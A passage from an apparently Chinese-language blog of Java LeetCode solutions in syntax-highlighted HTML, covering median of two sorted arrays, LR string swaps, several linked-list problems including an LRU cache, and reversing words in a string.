class="type">double</span>)nums1[i - <span class="number">1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    maxLeft = (<span class="type">double</span>)Math.max(nums1[i - <span class="number">1</span>], nums2[j - <span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((m + n) % <span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> maxLeft;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i == m)&#123;</span><br><span class="line">            minRight = (<span class="type">double</span>)nums2[j];</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(j == n)&#123;</span><br><span class="line">            minRight = (<span class="type">double</span>)nums1[i];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            minRight = (<span class="type">double</span>)Math.min(nums1[i], nums2[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">double</span>)(maxLeft + minRight) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="swap-adjacent-in-lr-string">Swap Adjacent in LR String</span></h2><p>In a string composed of <code>&#39;L&#39;</code>, <code>&#39;R&#39;</code>, and <code>&#39;X&#39;</code> characters, like <code>&quot;RXXLRXRXL&quot;</code>, a move consists of either replacing one occurrence of <code>&quot;XL&quot;</code> with <code>&quot;LX&quot;</code>, or replacing one occurrence of <code>&quot;RX&quot;</code> with <code>&quot;XR&quot;</code>. Given the starting string <code>start</code> and the ending string <code>end</code>, return <code>True</code> if and only if there exists a sequence of moves to transform one string to the other.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: start = &quot;RXXLRXRXL&quot;, end = &quot;XRLXXRRLX&quot;</span><br><span class="line">Output: True</span><br><span class="line">Explanation:</span><br><span class="line">We can transform start to end following these steps:</span><br><span class="line">RXXLRXRXL -&gt;</span><br><span class="line">XRXLRXRXL -&gt;</span><br><span class="line">XRLXRXRXL -&gt;</span><br><span class="line">XRLXXRRXL -&gt;</span><br><span class="line">XRLXXRRLX</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canTransform</span><span class="params">(String start, String end)</span> &#123;</span><br><span class="line">       <span class="type">char</span>[] s=start.toCharArray();</span><br><span class="line">       <span class="type">char</span>[] e=end.toCharArray();</span><br><span class="line">       <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span>(s.length!=e.length) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.length;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(s[i]==<span class="string">&#x27;X&#x27;</span>) cnt++;</span><br><span class="line">           <span class="keyword">if</span>(e[i]==<span class="string">&#x27;X&#x27;</span>) cnt--;</span><br><span class="line">       &#125;        </span><br><span class="line">       <span class="keyword">if</span>(cnt!=<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (p1 &lt; start.length()) &#123;           </span><br><span class="line">       <span class="keyword">while</span> (p1 &lt; s.length &amp;&amp; s[p1] == <span class="string">&#x27;X&#x27;</span>) p1++;</span><br><span class="line">       <span class="keyword">while</span> (p2 &lt; e.length &amp;&amp; e[p2] == <span class="string">&#x27;X&#x27;</span>) p2++;</span><br><span class="line">       <span class="keyword">if</span> (p1 == s.length &amp;&amp; p2 == e.length) <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">       <span class="keyword">if</span> (p1 == s.length || p2 == e.length) <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">       <span class="keyword">if</span>(s[p1] != e[p2]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">          </span><br><span class="line">       <span class="keyword">if</span> (s[p1] == <span class="string">&#x27;R&#x27;</span> &amp;&amp; p1 &gt; p2) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="keyword">if</span> (s[p1] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; p1 &lt; p2) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       p1++;</span><br><span class="line">       p2++;</span><br><span class="line">   &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="链表">链表</span></h1><h2><span id="merge-k-sorted-lists-">Merge k Sorted Lists -</span></h2><p>Merge <em>k</em> sorted linked lists and return it as one sorted list. Analyze and describe its complexity.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  1-&gt;4-&gt;5,</span><br><span class="line">  1-&gt;3-&gt;4,</span><br><span class="line">  2-&gt;6</span><br><span class="line">]</span><br><span class="line">Output: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">mergeKLists</span><span class="params">(ListNode[] lists)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(lists==<span class="literal">null</span>||lists.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        PriorityQueue&lt;ListNode&gt; q = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;ListNode&gt;(lists.length, (a,b)-&gt; a.val-b.val);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        ListNode tail=dummy;</span><br><span class="line">         <span class="keyword">for</span> (ListNode node:lists)</span><br><span class="line">            <span class="keyword">if</span> (node!=<span class="literal">null</span>)</span><br><span class="line">                q.add(node);</span><br><span class="line">         <span class="keyword">while</span> (!q.isEmpty())&#123;</span><br><span class="line">            tail.next=q.poll();</span><br><span class="line">            tail=tail.next;            </span><br><span class="line">            <span class="keyword">if</span> (tail.next!=<span class="literal">null</span>)</span><br><span class="line">                q.add(tail.next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="lru-">LRU -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LRU</span>&#123;</span><br><span class="line">    HashMap&lt;Integer,Node&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">int</span> cap=<span class="number">0</span>,cnt=<span class="number">0</span>;</span><br><span class="line">    Node tail,head;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        Node pre,next;</span><br><span class="line">        <span class="type">int</span> key,val;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">int</span> key,<span class="type">int</span> val)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.key=key;</span><br><span class="line">            <span class="built_in">this</span>.val=val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LRU</span><span class="params">(<span class="type">int</span> cap)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.cap=cap;</span><br><span class="line">        head=<span class="keyword">new</span> <span class="title class_">Node</span>();</span><br><span class="line">        tail=<span class="keyword">new</span> <span class="title class_">Node</span>();</span><br><span class="line">        head.next=tail;</span><br><span class="line">        tail.pre=head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">tmp</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="literal">null</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        remove(tmp);</span><br><span class="line">        add(tmp);</span><br><span class="line">        <span class="keyword">return</span> tmp.val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> key,<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">tmp</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="literal">null</span>)&#123;</span><br><span class="line">            Node n=<span class="keyword">new</span> <span class="title class_">Node</span>(key,val);</span><br><span class="line">            add(n);</span><br><span class="line">            map.put(key,n);</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            tmp.val=val;</span><br><span class="line">           remove(tmp);</span><br><span class="line">            add(tmp);</span><br><span class="line">        &#125;<span class="keyword">if</span>(cnt&gt;cap)&#123;</span><br><span class="line">            map.remove(tail.pre.key);</span><br><span class="line">            remove(tail.pre);            </span><br><span class="line">            cnt--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Node n)</span>&#123;</span><br><span class="line">        Node next=head.next;</span><br><span class="line">        head.next=n;</span><br><span class="line">        n.pre=head;</span><br><span class="line">        next.pre=n;</span><br><span class="line">        n.next=next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Node n)</span>&#123;</span><br><span class="line">        Node before=n.pre,after=n.next;</span><br><span class="line">        before.next=after;</span><br><span class="line">        after.pre=before;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="reverse-nodes-in-k-group-">Reverse Nodes in K-group -</span></h2><p>Given a linked list, reverse the nodes of a linked list <em>k</em> at a time and return its modified list.</p><p><em>k</em> is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of <em>k</em> then left-out nodes in the end should remain as it is.</p><p><strong>Example:</strong></p><p>Given this linked list: <code>1-&gt;2-&gt;3-&gt;4-&gt;5</code></p><p>For <em>k</em> &#x3D; 2, you should return: <code>2-&gt;1-&gt;4-&gt;3-&gt;5</code></p><p>For <em>k</em> &#x3D; 3, you should return: <code>3-&gt;2-&gt;1-&gt;4-&gt;5</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseKGroup</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">       <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> calLen(head,<span class="number">0</span>);</span><br><span class="line">       ListNode dummy=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">       dummy.next=head;</span><br><span class="line">       <span class="type">int</span> cyc=len/k;</span><br><span class="line">       ListNode pre=dummy,l1=head,l2=head;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;cyc;i++)&#123;            </span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;k;j++)&#123;</span><br><span class="line">               l2=l2.next;</span><br><span class="line">           &#125;</span><br><span class="line">           ListNode next=l2.next;</span><br><span class="line">           l2.next=<span class="literal">null</span>;</span><br><span class="line">           ListNode tmp=l1;</span><br><span class="line">           reverse(l1);</span><br><span class="line">           pre.next=l2;</span><br><span class="line">           tmp.next=next;</span><br><span class="line">           pre=tmp;</span><br><span class="line">           l1=next;</span><br><span class="line">           l2=next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> dummy.next;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">calLen</span><span class="params">(ListNode head,<span class="type">int</span> res)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">       <span class="keyword">return</span> calLen(head.next,res+<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(ListNode root)</span>&#123;</span><br><span class="line">       ListNode head=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">       <span class="keyword">while</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">           <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.next;</span><br><span class="line">           root.next=head.next;</span><br><span class="line">           head.next=root;</span><br><span class="line">           root=tmp;</span><br><span class="line">       &#125;       </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="copy-list-with-random-pointer-">Copy List with Random Pointer -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Node <span class="title function_">copyRandomList</span><span class="params">(Node head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">        Node phead=head;</span><br><span class="line">        <span class="keyword">while</span>(phead!=<span class="literal">null</span>)&#123;</span><br><span class="line">            Node next=phead.next;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(phead.val);</span><br><span class="line">            phead.next=tmp;</span><br><span class="line">            tmp.next=next;</span><br><span class="line">            phead=next;</span><br><span class="line">        &#125;</span><br><span class="line">        phead=head;</span><br><span class="line">        <span class="keyword">while</span>(phead!=<span class="literal">null</span>)&#123;</span><br><span class="line">            Node next=phead.next;</span><br><span class="line">            Node r=phead.random;</span><br><span class="line">            <span class="keyword">if</span>(r!=<span class="literal">null</span>)&#123;</span><br><span class="line">              next.random=r.next;</span><br><span class="line">            &#125;            </span><br><span class="line">            phead=next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        phead=head;</span><br><span class="line">        Node res=head.next;</span><br><span class="line">        <span class="keyword">while</span>(phead!=<span class="literal">null</span>&amp;&amp;phead.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            Node next=phead.next;</span><br><span class="line">            phead.next=next.next;</span><br><span class="line">            phead=next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="merge-two-sorted-lists">Merge Two Sorted Lists √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;        </span><br><span class="line">        ListNode head=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">res</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">null</span>&amp;&amp;l2!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l1.val&lt;=l2.val)&#123;</span><br><span class="line">                 head.next=l1;</span><br><span class="line">                l1=l1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                head.next=l2;</span><br><span class="line">                l2=l2.next;</span><br><span class="line">            &#125; </span><br><span class="line">            head=head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        head.next = l1==<span class="literal">null</span>?l2:l1;</span><br><span class="line">        <span class="keyword">return</span> res.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="add-two-numbers">Add Two Numbers √</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: (2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">Output: 7 -&gt; 0 -&gt; 8</span><br><span class="line">Explanation: 342 + 465 = 807.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>,carry=<span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">now</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">null</span>||l2!=<span class="literal">null</span>||carry!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> l1==<span class="literal">null</span>?<span class="number">0</span>:l1.val;</span><br><span class="line">            <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> l2==<span class="literal">null</span>?<span class="number">0</span>:l2.val;</span><br><span class="line">            sum = x+y+carry;</span><br><span class="line">            now.next=<span class="keyword">new</span> <span class="title class_">ListNode</span>(sum%<span class="number">10</span>);</span><br><span class="line">            now=now.next;</span><br><span class="line">            carry=sum/<span class="number">10</span>;</span><br><span class="line">            l1 = l1==<span class="literal">null</span>?<span class="literal">null</span>:l1.next;</span><br><span class="line">            l2 = l2==<span class="literal">null</span>?<span class="literal">null</span>:l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="add-two-numbers-ii">Add Two Numbers II √</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: (7 -&gt; 2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">Output: 7 -&gt; 8 -&gt; 0 -&gt; 7</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        Stack&lt;Integer&gt; s1 = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        Stack&lt;Integer&gt; s2 = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">null</span>)&#123;</span><br><span class="line">            s1.push(l1.val);</span><br><span class="line">            l1=l1.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(l2!=<span class="literal">null</span>)&#123;</span><br><span class="line">            s2.push(l2.val);</span><br><span class="line">            l2=l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> carry=<span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">while</span>(!s1.isEmpty()||!s2.isEmpty()||carry!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> s1.isEmpty()?<span class="number">0</span>:s1.pop();</span><br><span class="line">            <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> s2.isEmpty()?<span class="number">0</span>:s2.pop();</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> x+y+carry;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum%<span class="number">10</span>);</span><br><span class="line">            carry=sum/<span class="number">10</span>;</span><br><span class="line">            node.next=ans.next;</span><br><span class="line">            ans.next=node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="reverse-words-in-a-string-">Reverse Words in a String -</span></h2><p>Given an input string, reverse the string word by word. </p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;the sky is blue&quot;</span><br><span class="line">Output: &quot;blue is sky the&quot;</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;  hello world!  &quot;</span><br><span class="line">Output: &quot;world! hello&quot;</span><br><span class="line">Explanation: Your reversed string should not contain leading or trailing spaces.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span>[] a = s.toCharArray();</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> a.length;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// step 1. reverse the whole string</span></span><br><span class="line">    reverse(a, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// step 2. reverse each word</span></span><br><span class="line">    reverseWords(a, n);</span><br><span class="line">    <span class="comment">// step 3. clean up spaces</span></span><br><span class="line">    <span class="keyword">return</span> cleanSpaces(a, n);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">void</span> <span class="title function_">reverseWords</span><span class="params">(<span class="type">char</span>[] a, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span 